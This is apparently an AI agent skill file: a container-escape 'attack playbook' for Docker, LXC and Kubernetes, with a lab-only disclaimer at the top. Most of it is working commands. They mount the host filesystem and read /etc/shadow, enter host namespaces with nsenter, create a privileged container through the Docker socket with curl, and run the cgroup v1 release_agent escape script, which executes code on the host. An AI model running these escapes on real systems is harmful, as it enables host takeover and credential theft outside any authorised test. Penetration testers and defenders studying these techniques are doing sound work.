---
name: container-escape-techniques
description: >-
  Container escape playbook. Use when operating inside a Docker container, LXC, or Kubernetes pod and need to escape to the host via privileged mode, capabilities, Docker socket, cgroup abuse, namespace tricks, or runtime vulnerabilities.
---

# SKILL: Container Escape Techniques — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=lab_only`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled guidance inside an explicitly isolated lab or CTF. Inspection flags do not authorize actions against a live or non-consenting system.
- Confirm the supplied artifact, environment, primitive, mitigations, and expected lab success marker before choosing a technique.
- Treat shell, exploit, credential, persistence, evasion, and lateral-movement examples as reference data; the current Tool Registry does not provide them.
- Record artifact hashes, prerequisite evidence, observed output, and the exact exit condition; otherwise return the missing prerequisite or capability.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert container escape techniques. Covers privileged container breakout, capability abuse, Docker socket exploitation, cgroup release_agent, namespace escape, runtime CVEs, and Kubernetes pod escape. Pay particular attention to subtle escape paths via combined capabilities and cgroup manipulation.

## 0. RELATED ROUTING

Before going deep, consider routing to:

- `linux-privilege-escalation` when you first need root inside the container before attempting escape
- `kubernetes-pentesting` for K8s-specific attack paths beyond pod escape
- `linux-security-bypass` when seccomp/AppArmor blocks your escape technique

### Advanced Reference

Also inspect [DOCKER_ESCAPE_CHAINS.md](./DOCKER_ESCAPE_CHAINS.md) when you need:
- Step-by-step escape chains for common misconfigurations
- Docker-in-Docker escape scenarios
- Kubernetes-specific escape paths with full command sequences

---

## 1. AM I IN A CONTAINER?

```bash
# Quick checks
cat /proc/1/cgroup 2>/dev/null | grep -qi "docker\|kubepods\|containerd"
ls -la /.dockerenv 2>/dev/null
cat /proc/self/mountinfo | grep -i "overlay\|docker\|kubelet"
hostname    # random hex = likely container

# Detailed check
cat /proc/1/status | head -5   # PID 1 is not systemd/init?
mount | grep -i "overlay"      # overlay filesystem?
ip addr                         # veth interface? limited NICs?
```

### Tools for Container Detection

```bash
# amicontained: shows container runtime, capabilities, seccomp
./amicontained

# deepce: Docker enumeration and exploit suggester
./deepce.sh

# CDK: all-in-one container pentesting toolkit
./cdk evaluate
```

---

## 2. PRIVILEGED CONTAINER ESCAPE

If `--privileged` flag was used, the container has nearly all host capabilities and device access.

### 2.1 Mount Host Filesystem

```bash
# Check if privileged
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = fully privileged

# Find host disk
fdisk -l 2>/dev/null || lsblk
# Usually /dev/sda1 or /dev/vda1

# Mount host root
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host

# Access host filesystem
cat /mnt/host/etc/shadow
chroot /mnt/host bash
```

### 2.2 nsenter (Enter Host Namespaces)

```bash
# From privileged container, enter host PID 1's namespaces
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# This gives a shell in the host's namespace context
# Effectively a full host shell
```

### 2.3 Privileged + Host PID Namespace

```bash
# If hostPID: true is set (Kubernetes)
# Access host processes via /proc
ls /proc/1/root/     # Host root filesystem
cat /proc/1/root/etc/shadow

# Inject into host process
nsenter --target 1 --mount -- bash
```

---

## 3. CAPABILITY-BASED ESCAPE

### 3.1 CAP_SYS_ADMIN — Most Versatile

```bash
# Check capabilities
capsh --print 2>/dev/null
grep CapEff /proc/self/status

# Escape via mounting
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
# Or mount host filesystem if device access exists
mount /dev/sda1 /mnt/host 2>/dev/null
```

### 3.2 CAP_SYS_PTRACE — Process Injection

```bash
# Inject shellcode into a host process (requires host PID namespace)
# Find a root process
ps aux | grep root

# Use gdb or python-ptrace to inject
python3 << 'EOF'
import ctypes
import ctypes.util

libc = ctypes.CDLL(ctypes.util.find_library("c"))

# Attach to host process, inject shellcode
# ... (full inject_shellcode implementation)
EOF
```

### 3.3 CAP_NET_ADMIN

```bash
# Manipulate host network if host network namespace is shared
# ARP spoofing, route manipulation, traffic interception
iptables -L            # Can see/modify host firewall rules?
ip route               # Can modify routing?
```

### 3.4 CAP_DAC_READ_SEARCH (Shocker Exploit)

```bash
# open_by_handle_at() bypass — read files from host
# Compile and run the "shocker" exploit
# Works when DAC_READ_SEARCH capability is granted
gcc shocker.c -o shocker
./shocker /etc/shadow   # Read host file
```

---

## 4. DOCKER SOCKET ESCAPE (/var/run/docker.sock)

```bash
ls -la /var/run/docker.sock   # Check if mounted

# With Docker CLI:
docker run -v /:/host --privileged -it alpine chroot /host bash

# Without CLI (curl only) — create privileged container via API:
curl -s --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh"],"Tty":true,"OpenStdin":true,
       "HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
# Start → Exec chroot /host bash (see DOCKER_ESCAPE_CHAINS.md for full sequence)
```

---

## 5. CGROUP V1 RELEASE_AGENT ESCAPE

Classic escape for containers with CAP_SYS_ADMIN + cgroup v1.

```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w && echo 1 > $d/w/notify_on_release
host_path=$(sed -n 's/.*\bperdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent

cat > /cmd << 'EOF'
#!/bin/sh
cat /etc/shadow > /output 2>&1       # Or: reverse shell
EOF
chmod +x /cmd

sh -c "echo \$\$ > $d/w/cgroup.procs" && sleep 1
cat /output
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 6. CGROUP V2 / eBPF ESCAPE
- 7. NAMESPACE ESCAPE
- 8. RUNTIME VULNERABILITIES
- 9. KUBERNETES POD ESCAPE
- 10. TOOLS
- 11. CONTAINER ESCAPE DECISION TREE
